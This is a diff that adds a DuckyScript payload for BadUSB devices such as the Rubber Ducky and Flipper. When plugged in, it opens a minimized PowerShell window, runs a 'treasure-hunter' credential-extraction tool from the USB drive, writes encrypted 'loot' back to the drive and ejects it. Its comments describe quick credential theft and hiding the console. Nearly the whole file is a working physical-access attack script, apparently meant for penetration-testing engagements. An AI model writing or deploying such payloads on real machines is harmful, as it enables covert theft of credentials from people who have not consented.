@@ -1,0 +1,22 @@
+REM ============================================================
+REM TREASURE-HUNTER: Smash and Grab
+REM ============================================================
+REM Quick credential extraction to USB storage
+REM Device: Hak5 Rubber Ducky / O.MG / Flipper BadUSB
+REM Duration: ~10s keystroke + 5min scan
+REM OPSEC: Console visible briefly, then minimized
+REM ============================================================
+
+REM Wait for USB enumeration
+DELAY 2000
+
+REM Open PowerShell (hidden window)
+GUI r
+DELAY 500
+STRING powershell -w minimized
+ENTER
+DELAY 1000
+
+REM Run treasure-hunter from USB drive, output to USB
+STRING $d=(Get-Volume | Where-Object {Test-Path "$($_.DriveLetter):\treasure-hunter.exe"}).DriveLetter; if($d){& "$d`:\treasure-hunter.exe" -p smash -o "$d`:\loot.jsonl" --encrypt --passphrase 'engagement-key-2024' -q; (New-Object -ComObject Shell.Application).NameSpace(17).ParseName("$d`:").InvokeVerb('Eject')}
+ENTER
